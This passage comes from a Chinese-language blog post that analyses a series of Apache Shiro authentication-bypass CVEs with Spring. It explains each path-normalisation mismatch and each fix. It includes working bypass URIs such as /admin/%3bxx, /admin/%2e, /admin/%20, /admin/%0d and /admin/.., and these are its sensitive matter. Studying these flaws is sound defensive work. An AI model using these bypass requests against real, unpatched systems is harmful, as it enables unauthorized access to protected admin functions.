<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(value=&quot;/admin/&#123;name&#125;&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">list</span><span class="params">(<span class="meta">@PathVariable</span> String name)</span>&#123;</span><br><span class="line">    xxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>动态接收name的值作为请求参数进行处理</p>
<h4 id="第二个绕过"><a href="#第二个绕过" class="headerlink" title="第二个绕过"></a>第二个绕过</h4><p>还有一个坑点，是利用<code>;</code>进行的绕过，也就是1957未修复的坑点</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303292335722.png" alt="image-20230329233532664"></p>
<p>也就是在获取contextPath时，会有带有分号的情况，然后调用decodeAndCleanUriString会截取分号之前的部分，举个例子：</p>
<p>我们配置<code>/xx</code>需要认证才能访问，我们访问的uri为<code>/;/admin/xx</code>，则通过request的getContextPath方法获取到的contextPath为<code>/;/admin</code>，经过decodeAndCleanUriString方法的洗礼，他会截取<code>;</code>之前的部分，即<code>/</code>，然后使用<code>/</code>去匹配需要认证的路由，未匹配上，成功的进行了绕过；而后续在Spring-Web的处理中，他会处理成<code>/admin/xx</code>，这时候就成功访问到了<code>/admin/xx</code>的controller且无需认证</p>
<p>原理是在调用Tomcat的Request的getContextPath方法获取contextPath时</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303300008924.png" alt="image-20230330000851864"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303300012565.png" alt="image-20230330001242503"></p>
<h3 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h3><p>在后续的版本中，去除getRequestUri的调用，那么就同时修复了两个绕过</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303300024232.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303300015468.png" alt="image-20230330001546418"></p>
<h2 id="CVE-2020-13933"><a href="#CVE-2020-13933" class="headerlink" title="CVE-2020-13933"></a>CVE-2020-13933</h2><h3 id="漏洞描述-7"><a href="#漏洞描述-7" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1.6.0之前的Apache Shiro，当使用Apache Shiro时，特制的HTTP请求可能导致认证绕过。</p>
<h3 id="适用范围-7"><a href="#适用范围-7" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>Shiro &lt; 1.6.0</li>
</ul>
<h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>还是利用SpringWeb和Shiro处理方式的差异进行绕过</p>
<p>在Shiro中，先解码、后处理分号，然后再标准化路径</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301343994.png" alt="image-20230330134325921"></p>
<p>在SpringWeb中，先处理分号，再解码，然后标准化路径</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291925275.png" alt="image-20230329192528228"></p>
<p>主要是前面两个步骤的差距，可以导致绕过</p>
<p>我们将<code>;</code>编码成%3b</p>
<ol>
<li>在Shiro中，他会先解码成分号然后截取分号前的内容</li>
<li>在SpringWeb中，首先他找不到分号，因为分号已经被编码成%3b，相当于他不会处理分号，然后他才将分号解码</li>
</ol>
<p>所以我们可以使用<code>;</code>去绕过一些需要认证的路径，只要他截取的分号前的内容设置了不需要验证即可</p>
<p><code>/admin/*</code>需要认证才能访问，而我们通过加个%3b，即<code>/admin/%3bxx</code>，在Shiro中，他会解码成分号，然后截取分号前的内容，即<code>/admin/</code>，这里就绕过了Shiro的过滤器，在后续Spring-Web处理中，该路径被处理成<code>/admin/;xx</code>就成功访问到了controller</p>
<p>同样，也是如下场景</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(value=&quot;/admin/&#123;name&#125;&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">list</span><span class="params">(<span class="meta">@PathVariable</span> String name)</span>&#123;</span><br><span class="line">    xxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a>修复</h3><p>Shiro新增了个全局过滤器，为InvalidRequestFilter</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301404673.png" alt="image-20230330140434584"></p>
<p>这个类InvalidRequestFilter会检测uri是否存在分号、反斜杠以及非ASCII码字符，若检测到就会返回状态码400，消息为Invalid request</p>
<h2 id="CVE-2020-17510"><a href="#CVE-2020-17510" class="headerlink" title="CVE-2020-17510"></a>CVE-2020-17510</h2><h3 id="漏洞描述-8"><a href="#漏洞描述-8" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1.7.0之前的Apache Shiro，当与Spring一起使用Apache Shiro时，特制的HTTP请求可能导致认证绕过。</p>
<h3 id="适用范围-8"><a href="#适用范围-8" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>Shiro &lt; 1.7.0</li>
</ul>
<h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>同样还是SpringWeb和Shiro的处理差异造成的</p>
<p>这次是因为<code>.</code>号造成的绕过，<code>.</code>号编码为<code>%2e</code></p>
<p>那么对于Shiro和SpringWeb对待编码后的点号是怎么处理的呢？</p>
<p>在Shiro中，它会先解码成<code>.</code>，不需要处理分号，然后标准化路径去掉<code>.</code></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301343994.png" alt="image-20230330134325921"></p>
<p>而在Spring-Web中，首先无需处理分号，然后将<code>%2e</code>解码成<code>.</code>号，在getSanitizedPath也未处理<code>.</code>号</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303291925275.png" alt="image-20230329192528228"></p>
<p>所以可以使用编码后的点号进行绕过，同样也是设置<code>/admin/*</code>需要认证才能访问，此时我们加上<code>%2e</code>，变成<code>/admin/%2e</code>；</p>
<p>在Shiro中，处理成<code>/admin/</code>，无法匹配<code>/admin/*</code>而造成绕过</p>
<p>在Spring中，处理成<code>/admin/.</code>，成功访问到了<code>/admin</code>下的路由</p>
<p>同样也是以下场景会造成该漏洞</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(value=&quot;/admin/&#123;name&#125;&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBodypublic</span> </span><br><span class="line"><span class="keyword">void</span> <span class="title function_">list</span><span class="params">(<span class="meta">@PathVariable</span> String name)</span></span><br><span class="line">&#123;    </span><br><span class="line">    xxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="修复-6"><a href="#修复-6" class="headerlink" title="修复"></a>修复</h3><p>Shiro使用ShiroUrlPathHelper去继承了UrlPathHelper，然后将自己的ShiroUrlPathHelper注入到Spring中，替换掉默认处理的UrlPathHelper</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301521453.png" alt="image-20230330152131347"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301522374.png" alt="image-20230330152202324"></p>
<p>这样使得Spring使用了Shiro的方式去处理路径，统一了处理方式</p>
<h2 id="CVE-2020-17523"><a href="#CVE-2020-17523" class="headerlink" title="CVE-2020-17523"></a>CVE-2020-17523</h2><h3 id="漏洞描述-9"><a href="#漏洞描述-9" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1.7.1之前的Apache Shiro，当将Apache Shiro与Spring一起使用时，特制的HTTP请求可能导致认证绕过。</p>
<h3 id="适用范围-9"><a href="#适用范围-9" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>Shiro &lt; 1.7.1</li>
</ul>
<h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>再次绕过，这次是通过空格编码进行的绕过，空格编码为<code>%20</code></p>
<p>获取请求uri</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301542357.png" alt="image-20230330154221277"></p>
<p>这里只会解码<code>%20</code>，变成空格</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301343994.png" alt="image-20230330134325921"></p>
<p>然后处理完，进行路径的匹配，进入pathMatches查看</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301544051.png" alt="image-20230330154424953"></p>
<p>进入</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301546172.png" alt="image-20230330154656110"></p>
<p>后面会来到AntPathMatcher#doMatch进行匹配</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301547509.png" alt="image-20230330154734447"></p>
<p>进入tokenizeToStringArray</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301558125.png" alt="image-20230330155809063"></p>
<p>进入tokenizeToStringArray</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301600226.png" alt="image-20230330160008110"></p>
<p>其实就是使用<code>/</code>分割字符串然后去除空格的这么一个操作，其实总的来说就是去掉空格</p>
<p>而SpringWeb跟Shiro也是一样的处理</p>
<p>设置<code>/admin/*</code>需要认证才能访问，我们使用<code>/admin/%20</code>，经过Shiro他会处理成<code>/admin/</code>，匹配不上<code>/admin/*</code>从而导致绕过，同样也是以下场景会导致该漏洞</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(value=&quot;/admin/&#123;name&#125;&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBodypublic</span> </span><br><span class="line"><span class="keyword">void</span> <span class="title function_">list</span><span class="params">(<span class="meta">@PathVariable</span> String name)</span></span><br><span class="line">&#123;    </span><br><span class="line">    xxx</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="修复-7"><a href="#修复-7" class="headerlink" title="修复"></a>修复</h3><p>在<code>StringUtils#tokenizeToStringArray</code> 方法的第三个参数 trimTokens 为 false，也就是不去除空格</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301603321.png" alt="image-20230330160347211"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301603349.png" alt="image-20230330160304239"></p>
<h2 id="CVE-2021-41303-x2F-Shiro-825"><a href="#CVE-2021-41303-x2F-Shiro-825" class="headerlink" title="CVE-2021-41303&#x2F;Shiro-825"></a>CVE-2021-41303&#x2F;Shiro-825</h2><h3 id="漏洞描述-10"><a href="#漏洞描述-10" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1.8.0之前的Apache Shiro，当与Spring Boot一起使用Apache Shiro时，特制的HTTP请求可能会导致认证绕过。</p>
<h3 id="适用范围-10"><a href="#适用范围-10" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>Shiro &lt; 1.8.0</li>
</ul>
<h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p>在上面那个CVE-2020-17523中，后续的1.7.1版本又增加了新的逻辑</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301751860.png" alt="image-20230330175140741"></p>
<p>如图，它首先会比对原始uri，没比对到再去掉末尾斜杆再进行比对，比对到了就将去掉末尾斜杆uri进行传入</p>
<p>当设置如下配置时，就会产生漏洞</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">/admin/* authc</span><br><span class="line">/admin/list anon</span><br></pre></td></tr></table></figure>

<p>按理来说，当我们访问<code>/admin</code>目录下的任何路由(不跨目录)都需要鉴权，所以一般来说没有认证都是访问不了这个<code>/admin/list</code>的</p>
<p>但是这个漏洞就是可以绕过第一个配置，去访问第二个路由</p>
<p>首先我们传入的poc为<code>/admin/list/</code>，依据顺序，他首先会匹配第一个，因为原始的uri：<code>/admin/list/</code>匹配不到<code>/admin/*</code>，此时会去掉uri的最后一个斜杆进行匹配，即<code>/admin/list</code>，此时就匹配到了<code>/admin/*</code>，然后进入filterChainManager.proxy，并将去掉斜杆的uri传入，即<code>/admin/list</code></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301745497.png" alt="image-20230330174518387"></p>
<p>进入filterChainManager.proxy进行查看</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301755475.png" alt="image-20230330175530419"></p>
<p>再进入getChain查看</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301756780.png" alt="image-20230330175601713"></p>
<p>从map中取，发现刚好有，而对于没有配置的，例如访问<code>/admin/li/</code>，他取不到，就会抛出异常</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301758763.png" alt="image-20230330175821706"></p>
<p>回到对<code>/admin/list/</code>的访问中，在后续他会将代理filterChain返回</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301803727.png" alt="image-20230330180308668"></p>
<p>代理filterChain有两个filter，第一个为登录过滤器，第二为匿名过滤器</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301805117.png" alt="image-20230330180507064"></p>
<p>匿名过滤器直接放行，此时就会去访问<code>/admin/list</code>的controller了，此时就成功的进行了绕过</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301806579.png" alt="image-20230330180636506"></p>
<p>这个利用条件特别极端，正常人不会这样写配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin/* authc</span><br><span class="line">/admin/list anon</span><br></pre></td></tr></table></figure>

<h3 id="修复-8"><a href="#修复-8" class="headerlink" title="修复"></a>修复</h3><p>在1.8.0中，传入的参数由requestURINoTrailingSlash变成pathPattern，即<code>/admin/*</code>而不是<code>/admin/list</code></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301813452.png" alt="image-20230330181312333"></p>
<p>而在map中取到的就是需要认证的<code>/admin/*</code>了</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301814806.png" alt="image-20230330181449743"></p>
<p>这时就无法绕过第一个配置项去访问第二个配置项了</p>
<h2 id="CVE-2022-32532"><a href="#CVE-2022-32532" class="headerlink" title="CVE-2022-32532"></a>CVE-2022-32532</h2><h3 id="漏洞描述-11"><a href="#漏洞描述-11" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Shiro在1.9.1之前，RegexRequestMatcher可能被错误配置，导致在一些servlet容器上被绕过。使用RegExPatternMatcher的正则表达式中含有<code>.</code>的应用程序可能会受到权限绕过的影响。</p>
<h3 id="适用范围-11"><a href="#适用范围-11" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>Shiro &lt; 1.9.1</li>
</ul>
<h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303302116311.png" alt="image-20230330211643248"></p>
<p>Shiro有两种表达式可以匹配路径，一种是AntPathMatcher，另一种是RegExPatternMatcher，前面一直都是使用Ant风格，也就是第一种</p>
<table>
<thead>
<tr>
<th align="center">通配符</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">?</td>
<td align="center">匹配任何单字符</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">匹配0或者任意数量的字符</td>
</tr>
<tr>
<td align="center">**</td>
<td align="center">匹配0或者更多的目录</td>
</tr>
</tbody></table>
<p>第二种其实就是正则表达式</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303302117570.png" alt="image-20230330211727509"></p>
<p>这个漏洞很好理解，当配置了需要认证的路径为<code>/admin/.*</code>，而在正则表达式中元字符<code>.</code>是匹配除换行符（<code>\n</code>、<code>\r</code>）之外的任何单个字符，<code>\r</code>的URL编码为<code>%0d</code>，<code>\n</code>的URL编码为<code>%0a</code>，所以可以使用<code>/admin/%0d</code>或者<code>/admin/%0a</code>，这样就无法匹配<code>/admin/.*</code>从而绕过认证</p>
<h3 id="修复-9"><a href="#修复-9" class="headerlink" title="修复"></a>修复</h3><p>新增caseInsensitive，并且默认为false</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303302256855.png" alt="image-20230330225625787"></p>
<p>Pattern.compile第二个参数为32，表示启用DOTALL模式，此时元字符<code>.</code>会匹配换行符（<code>\n</code>、<code>\r</code>）在内的任何单个字符</p>
<h2 id="CVE-2022-40664"><a href="#CVE-2022-40664" class="headerlink" title="CVE-2022-40664"></a>CVE-2022-40664</h2><h3 id="漏洞描述-12"><a href="#漏洞描述-12" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1.10.0之前的Apache Shiro，Shiro在通过RequestDispatcher进行请求转发(forward)或请求包括(include)时存在认证绕过漏洞。</p>
<h3 id="适用范围-12"><a href="#适用范围-12" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>Shiro &lt; 1.10.0</li>
</ul>
<h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>在进行请求转发或包含时不会进行鉴权，导致绕过</p>
<p>首先添加如下配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">map.put(&quot;/forward&quot;,&quot;anon&quot;);</span><br><span class="line">map.put(&quot;/admin/list&quot;,&quot;authc&quot;);</span><br></pre></td></tr></table></figure>

<p>设置<code>/admin/list</code>需要认证，<code>/forward</code>不需要认证</p>
<p>如下代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/admin/list&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">list</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;访问成功！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(&quot;/forward&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">forward</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;forward:/admin/list&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接访问<code>/admin/list</code></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303302324817.png" alt="image-20230330232433772"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303302324740.png" alt="image-20230330232422682"></p>
<p>会跳转到登录页面</p>
<p>而访问<code>/forward</code></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303302326442.png" alt="image-20230330232616272"></p>
<p>访问成功，绕过<code>/admin/list</code>的鉴权</p>
<p>在Tomcat应用的整个过滤链中，他会调用doFilter去依次执行过滤链中的每个过滤器</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311239017.png" alt="image-20230331123920877"></p>
<p>而doFilter又会调用internalDoFilter方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311241011.png" alt="image-20230331124156900"></p>
<p>在internalDoFilter中会去调用各个filter的doFilter方法</p>
<p>而在Shiro的doFilter方法中，若在一次请求中已经被Shiro的过滤器过滤过了的话，则不会再调用Shiro的filter再过滤一遍，然后将请求传给其他过滤链中的过滤器</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311243643.png" alt="image-20230331124344561"></p>
<p>因为请求<code>/forward</code>的时候，他会走一遍Shiro的过滤器，然后将alreadyFilteredAttributeName设置为shiroFilter.FILTERED，代表已经过滤过</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311249978.png" alt="image-20230331124915855"></p>
<p>然后在<code>/forward</code>的controller中，将请求进行转发</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311250749.png" alt="image-20230331125046681"></p>
<p>而访问<code>/admin/list</code>时，这两次的路由访问相当于一次请求，因为前面访问<code>/forward</code>路由时已经经过Shiro的过滤器过滤了一遍，所以此时访问<code>/admin/list</code>路由，则不会走Shiro的过滤器，从而绕过认证</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311252010.png" alt="image-20230331125245922"></p>
<h3 id="修复-10"><a href="#修复-10" class="headerlink" title="修复"></a>修复</h3><p>而在Shiro的1.10.0及以后，出现了个ShiroFilterConfiguration类</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311257888.png" alt="image-20230331125705830"></p>
<p>这个属性filterOncePerRequest若为false，则代表每次调用都会执行过滤器，这个属性若为true，则代表每次请求都会执行过滤器</p>
<p>而在OncePerRequestFilter的doFilter方法中，新增了个判断</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311258915.png" alt="image-20230331125843839"></p>
<h2 id="CVE-2023-22602"><a href="#CVE-2023-22602" class="headerlink" title="CVE-2023-22602"></a>CVE-2023-22602</h2><h3 id="漏洞描述-13"><a href="#漏洞描述-13" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>当把1.11.0之前的Apache Shiro与Spring Boot 2.6+ 一起使用时，特制的HTTP请求可能导致认证绕过。当Shiro和Spring Boot使用不同的模式匹配技术时，认证绕过就会发生。Shiro和Spring Boot &lt; 2.6时都默认为Ant风格的模式匹配。</p>
<h3 id="适用范围-13"><a href="#适用范围-13" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>SpringBoot &gt; 2.6 且 Shiro &lt; 1.11.0</li>
</ul>
<h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>SpringBoot 2.6+后，Controller的路径匹配默认使用<code>path_pattern_parser</code></p>
<p>2.6以前在配置文件中可以这样配置以使用<code>path_pattern_parser</code></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">mvc:</span></span><br><span class="line">    <span class="attr">pathmatch:</span></span><br><span class="line">      <span class="attr">matching-strategy:</span> <span class="string">path_pattern_parser</span></span><br></pre></td></tr></table></figure>

<p>2.6之前使用<code>ant_path_matcher</code>解析Controller的路径，Ant风格估计都很熟，前面说过好几次了，就当作复习一下</p>
<table>
<thead>
<tr>
<th align="center">通配符</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">?</td>
<td align="center">匹配任何单字符</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">匹配0或者任意数量的字符</td>
</tr>
<tr>
<td align="center">**</td>
<td align="center">匹配0或者更多的目录</td>
</tr>
</tbody></table>
<p>他们之间的差别在于：</p>
<p>ant_path_matcher的通配符可以在中间，如：<code>abc/**/xyz</code>。</p>
<p>path_pattern_parser的通配符只能定义在尾部，如：<code>abc/xyz/**</code>，且可以使用<code>&#123;*path&#125;</code>接收多级路由。<code>path</code>可以随意取名，与<code>@PathVariable</code>名称对应即可。</p>
<p>首先把环境搭一下</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311927715.png" alt="image-20230331192759638"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311928179.png" alt="image-20230331192810125"></p>
<p>设置<code>/login</code>和<code>/**</code>无需认证，<code>/admin/**</code>需要认证</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311928125.png" alt="image-20230331192834071"></p>
<p>再添加三个路由</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311929959.png" alt="image-20230331192943902"></p>
<p>先正常访问<code>/admin/ak</code>，由于需要认证会跳到登录页面</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311931645.png" alt="image-20230331193127587"></p>
<p>这时访问<code>/admin/..</code>，**注意！！！！不能直接在浏览器地址栏这样输入然后回车，这里有个坑点，浏览器看到uri有<code>..</code>会自动将uri变成<code>/</code>**，这个坑点导致我复现半天</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311934436.png" alt="image-20230331193449312"></p>
<p>抓包，却变成了<code>/</code></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311935904.png" alt="image-20230331193512839"></p>
<p>这时候改成<code>/admin/..</code>就行了</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311935061.png" alt="image-20230331193553003"></p>
<p>这时候就访问成功了</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311936364.png" alt="image-20230331193625301"></p>
<p>在PathMatchingFilterChainResolver的getChain方法下个断点</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311938154.png" alt="image-20230331193822080"></p>
<p>之前说过，调用getPathWithinApplication方法后续会将路径标准化，经过normalize的处理，会将<code>/admin/..</code>变成<code>/</code></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303301343994.png" alt="image-20230330134325921"></p>
<p>这时候由于pathMatches无法匹配，而返回null（暂且这么理解），绕过了Shiro的认证</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311941822.png" alt="image-20230331194100731"></p>
<p>后续进入Spring的处理中，在ServletRequestPathUtils的parseAndCache方法中会获取请求uri，并设置<code>PATH_ATTRIBUTE</code>属性，进入ServletRequestPath的parse方法查看</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311944915.png" alt="image-20230331194404835"></p>
<p>获取请求uri</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311944469.png" alt="image-20230331194434370"></p>
<p>获取到的为<code>/admin/..</code>，这里其实就是调用中间件的getRequestURI，后面那个if不重要，滤过，RequestPath.parse其实就是将uri包装了一下，包装成DefaultRequestPath类</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311946235.png" alt="image-20230331194635173"></p>
<p>然后设置属性PATH_ATTRIBUTE，并返回</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311950277.png" alt="image-20230331195002190"></p>
<p>这个属性很重要，然后就是Spring根据路径去匹配controller了</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311950789.png" alt="image-20230331195051727"></p>
<p>这里的usesPathPatterns方法就是判断是否用了<code>path_pattern_parser</code>模式，为true，然后removeAttribute方法移除UrlPathHelper.PATH_ATTRIBUTE属性（这跟刚刚设置的PATH_ATTRIBUTE属性不同），然后进入ServletRequestPathUtils.getParsedRequestPath(request);</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311954445.png" alt="image-20230331195459378"></p>
<p>在getParsedRequestPath方法里，其实就是获取之前设置的PATH_ATTRIBUTE属性的值，也就是那个包装了uri：<code>/admin/..</code>的类</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311956863.png" alt="image-20230331195636778"></p>
<p>回到initLookupPath方法，requestPath.pathWithinApplication().value()这一连串操作其实就是获取uri，这个removeSemicolonContent就是为了移除分号</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303311958648.png" alt="image-20230331195817556"></p>
<p>后续在AbstractHandlerMethodMapping的addMatchingMappings方法中寻找<code>/admin/..</code>匹配的controller，<code>/admin/**</code>匹配到了，放入List集合matches中</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303312002447.png" alt="image-20230331200209338"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303312003619.png" alt="image-20230331200341535"></p>
<p>然后根据<code>/admin/**</code>路径去寻找Bean</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303312005380.png" alt="image-20230331200550285"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303312005527.png" alt="image-20230331200559441"></p>
<p>然后就是执行这个Bean</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303312007293.png" alt="image-20230331200753182"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303312008388.png" alt="image-20230331200815328"></p>
<p>其实就是利用<code>/admin/..</code>会被Shiro标准化为<code>/</code>的特性，绕过Shiro的路径匹配，然后由于controller设置了<code>/admin/**</code>从而匹配到了该路径并执行</p>
<h3 id="修复-11"><a href="#修复-11" class="headerlink" title="修复"></a>修复</h3><h4 id="设置ant匹配路径"><a href="#设置ant匹配路径" class="headerlink" title="设置ant匹配路径"></a>设置ant匹配路径</h4><p>在application.yml设置使用ant匹配路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring:</span><br><span class="line">  mvc:</span><br><span class="line">    pathmatch:</span><br><span class="line">      matching-strategy: ant_path_matcher</span><br></pre></td></tr></table></figure>

<p>在AbstractHandlerMapping的initLookupPath方法中就会走else</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303312020501.png" alt="image-20230331202017421"></p>
<p>后续就会走到Shiro的获取uri的getPathWithinApplication方法，获取到的uri为<code>/</code></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303312021868.png" alt="image-20230331202104783"></p>
<h4 id="升级版本"><a href="#升级版本" class="headerlink" title="升级版本"></a>升级版本</h4><p>将Shiro升级到1.11.0以上</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303312038211.png" alt="image-20230331203855112"></p>
<p>继承了EnvironmentPostProcessor</p>
